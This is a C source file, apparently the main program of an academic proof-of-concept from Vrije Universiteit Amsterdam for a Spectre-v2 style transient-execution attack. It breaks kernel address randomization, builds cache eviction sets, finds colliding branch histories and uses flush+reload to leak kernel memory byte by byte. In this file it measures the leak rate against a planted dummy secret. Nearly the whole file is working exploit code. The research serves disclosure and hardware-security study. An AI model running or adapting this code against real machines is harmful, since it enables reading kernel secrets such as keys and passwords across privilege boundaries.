/*
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */


#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/select.h>

#include "common.h"
#include "targets.h"
#include "colliding_bhb.h"
#include "flush_and_reload.h"
#include "cbpf.h"

#include "../../../common/l2_eviction/evict_l2.h"
#include "../../../common/kaslr_prefetch/kaslr_prefetch.h"



#define TEST_ITERATIONS 10000


uint8_t * get_phys_map_start() {

    int fd;
    char buf[18];
    uint8_t * address;

    if (access(PATH_PHYS_MAP, F_OK) == 0) {
        fd = open(PATH_PHYS_MAP, O_RDONLY);
        assert(fd);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_PHYS_MAP);
        exit(EXIT_FAILURE);
    }

    assert(read(fd, buf, 18));

    assert(sscanf(buf, "%lx", (uint64_t *) &address) == 1);

    return address;

}

// ----------------------------------------------------------------------------
// Leak Core functions
//
// ----------------------------------------------------------------------------

#define LEAK_RATE_TEST_SIZE (100 * 32)

void leak_test_leakage_rate(struct config * cfg) {

    printf("-----------------------------------------------------------------------------\n");
    printf(" Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
    printf("-----------------------------------------------------------------------------\n");

    // ------------------------------------------------------------------------
    // Initialize a random buffer to leak

    // We set the the F+R buf to the second 4k page in the huge page
    cfg->fr_buf = cfg->ind_map + 0x2000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x2000;

    // We initialize the secret from the third 4k page onwards
    uint8_t *secret = cfg->ind_map + 0x10000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x10000;

    for (size_t i = 0; i < 32; i++) {
        secret[i + 7] = (uint8_t) ('A' + i);
    }

    memset(secret, 0, 7); // First 7 bytes are zero to start the leak


    uint8_t * leaked_bytes = calloc(1, 1 << 20);
    memcpy(leaked_bytes, secret, 7);


    set_load_chain_leak_secret(cfg);
    cfg->reload_addr = cfg->fr_buf;

    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    int found;

    *cfg->ind_secret_addr = (uint64_t) secret_kern - T_SECRET_ADDR__OFFSET;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes;

    // prefix = *(uint64_t *) (cur_byte - 7);

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    struct timeval t0, t1;
    gettimeofday(&t0, NULL);

    for (size_t outer = 0; outer < 100; outer++)
    {

        *cfg->ind_secret_addr = (uint64_t) secret_kern - T_SECRET_ADDR__OFFSET;


        for (size_t i = 0; i < 32; i++)
        {
            prefix = *(uint64_t *) (secret + i);

            prefix = prefix & 0xffffffffffffffLLU;

            found = leak_byte_forwards(cfg, prefix);

            size_t iter = 0;
            while (found == -1 ) {
                found = leak_byte_forwards(cfg, prefix);

                iter++;
                if (iter == 100) {
                    printf("\nStuck! at 0x%lx\n", *cfg->ind_secret_addr);

                }
            }
            *cur_byte = found;

            cur_byte += 1;
            *cfg->ind_secret_addr += 1;

            if (((32 * outer) + i) % (LEAK_RATE_TEST_SIZE / 50) == 0) {
                step++;
                printf("\r[%.*s", step, "..................................................");
                fflush(stdout);
            }

        }
    }

    gettimeofday(&t1, NULL);
    uint64_t delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\n%d kB took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE / 1024, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE / ( (double) delta_us / 1000000));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        if (secret[(i % 32) + 7] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE) * 100);


}


#define DUMMY_SECRET_LENGTH 32

void leak_dummy_secret(struct config * cfg) {

    // ------------------------------------------------------------------------
    // We setup a dummy secret and try to leak it

    printf("-----------------------------------------------------------------------------\n");
    printf(" Leaking Dummy secret\n");
    printf("-----------------------------------------------------------------------------\n");

    // Initialize secret
    uint8_t *secret = cfg->ind_map + 0x3000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x3000;

    memset(secret, 0x0, 7);

    // To test the zero extend prefix

    for (size_t i = 7; i < DUMMY_SECRET_LENGTH; i++) {
        secret[i] = (uint8_t) ('A' + i - 7);
    }

    printf("%15s: 0x%016lx\n", "secret addr user", (uint64_t)secret);
    printf("%15s: 0x%016lx\n", "secret addr kern", (uint64_t)secret_kern);


    set_load_chain_leak_secret(cfg);

    uint8_t leaked_bytes[DUMMY_SECRET_LENGTH] = {0};
    uint64_t prefix;
    int found;

    cfg->reload_addr = cfg->fr_buf;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - T_SECRET_ADDR__OFFSET;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 7;

    prefix = *(uint64_t *) (cur_byte - 7);


    for (unsigned i = 7; i < DUMMY_SECRET_LENGTH; i++)
    {
        prefix = *(uint64_t *) (cur_byte - 7);
        // printf("Using prefix: 0x%08lx\n", prefix);

        // printf("Trying to leak: 0x%08lx\n", *(uint64_t *) (secret + i - 8));


        found = leak_byte_forwards(cfg, prefix);

        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);
        }

        *cur_byte = found;

        printf("0x%lx 0x%03x: Found Byte: 0x%02x (%c) Used prefix: 0x%08lx\n", *cfg->ind_secret_addr + T_SECRET_ADDR__OFFSET, i, *cur_byte, *cur_byte, prefix);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

    }

}


// ----------------------------------------------------------------------------
// MAIN
//
// ----------------------------------------------------------------------------



int main(int argc, char **argv)
{
    struct config cfg = {0};
    uint64_t time_start;
    int opt;

    uint8_t use_proc_map = 0;


    while ((opt = getopt(argc, argv, "p")) != -1) {
        switch (opt) {
            case 'p': use_proc_map = 1; break;
            default:
                printf("Usage: %s\n"
                    "  -p                 Enable the use of proc pagemap (sudo)\n"
                    , argv[0]);
                exit(1);
        }
    }

    if (optind + 1 < argc) {
        printf("Usage: %s\n"
            "  -p                 Enable the use of proc pagemap (sudo)\n"
            , argv[0]);
        exit(1);
    }

    printf("================== ENVIRONMENT INFO ===================\n");
    fflush(stdout);

    (system("lscpu | grep '^Model name' | awk '{$1=$1}1'") + 1);
    (system("echo -n 'Linux version: ' && uname -r") + 1);
    (system("echo 'Linux spectre_v2 mitigation info:' && echo -n '- ' && cat /sys/devices/system/cpu/vulnerabilities/spectre_v2 | cut -d' ' -f2-") + 1);


    int seed = time(0);
    printf("Seed: %d\n", seed);
    srand(seed);

    // ------------------------------------------------------------------------
    // Setup buffers + fd's

    cfg.fd_sock = syscall(__NR_socket, /*domain=*/AF_UNIX, /*type=*/SOCK_STREAM, /*proto=*/0);
    assert(cfg.fd_sock);
    FD_ZERO(&cfg.fd_set);
    FD_SET(cfg.fd_sock, &cfg.fd_set);

    assert(syscall(__NR_select, /*n=*/4, /*inp=*/0x0,/*outp=*/&cfg.fd_set, /*exp=*/0ul, /*tvp=*/0x0) == 1);

    // ------------------------------------------------------------------------
    // Allocate a huge page

    cfg.ind_map = allocate_huge_page();

    cfg.phys_start = (uint8_t *) find_phys_map_start();
    printf("%20s: %#18lx\n", "Direct Map Start", (uint64_t) cfg.phys_start);

    uint64_t mem_total = get_mem_total();
    cfg.phys_end = cfg.phys_start + mem_total + (1LU << 30) + (uint64_t) (mem_total * 0.2);


    cfg.text_start = (uint8_t *) find_text_map_start();
    printf("%20s: %#18lx\n", "Kernel Text Start", (uint64_t) cfg.text_start);


    cfg.security_list_address = (uint64_t) cfg.text_start + SECURITY_LIST_PC_OFFSET;
    cfg.tfp_leak_target = (uint64_t) cfg.text_start  + TRANSMISSION_PC_OFFSET;

    printf("%20s: %#18lx\n", "Security List(evict)", cfg.security_list_address);
    printf("%20s: %#18lx\n", "TFP Target", cfg.tfp_leak_target);

    // ------------------------------------------------------------------------
    // Find the kernel address of our huge page

    if (add_seccomp_history_filter()) {
        return 1;
    };

    printf("------------------------------------------------------\n");
    printf("Finding eviction set for syscall table\n");
    printf("------------------------------------------------------\n");

    // find_ev_set_for_sys_call_table(cfg.security_list_address, cfg.security_list_address); // (uint64_t) 0xffffffff82d49128 + 0x18
    build_ev_set_l2((uint64_t) cfg.security_list_address, (void *) &cfg.ev_set_l2);



    if (use_proc_map) {
        cfg.ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg.ind_map, (uint64_t) cfg.phys_start));

        printf("%20s: %#18lx | %20s: %#18lx\n", "User Huge Page", (uint64_t) cfg.ind_map, "Kernel Huge Page", (uint64_t) cfg.ind_map_kern);

        cfg.fr_buf = cfg.ind_map + 0x2000;
        cfg.fr_buf_kern = cfg.ind_map_kern + 0x2000;
        printf("%20s: %#18lx | %20s: %#18lx\n", "User FR_BUF", (uint64_t) cfg.fr_buf, "Kernel FR_BUF", (uint64_t) cfg.fr_buf_kern);

        memset(cfg.fr_buf, 0x90, 0x1000);



        printf("------------------------------------------------------\n");
        printf("Find a colliding history for the victim -> target\n");
        printf("------------------------------------------------------\n");

        find_colliding_history(&cfg, -1);


    } else {

        time_start = time(0);
        // find the kernel address of the huge page
        printf("-----------------------------------------------------------------------------\n");
        printf("Finding huge page kernel address\n");
        printf("-----------------------------------------------------------------------------\n");

        if (find_hp_kern_address(&cfg, 0) != 0) {
            printf("Failed finding the huge page kernel address! please restart\n");
            exit(0);
        }

        printf("User huge page addr: %p Kernel huge page addr: %p\n", cfg.ind_map, cfg.ind_map_kern);

        printf("[+] Step took: %ld sec\n", time(0) - time_start);

    }


    printf("------------------------------------------------------\n");

    printf("%6s %6s %6s\n", "1LD", "2LDS", "3LDS");

    for (size_t i = 0; i < 10; i++)
    {
        print_leakage_rate(&cfg, TEST_ITERATIONS * 10);
    }

    leak_dummy_secret(&cfg);

    leak_test_leakage_rate(&cfg);

}
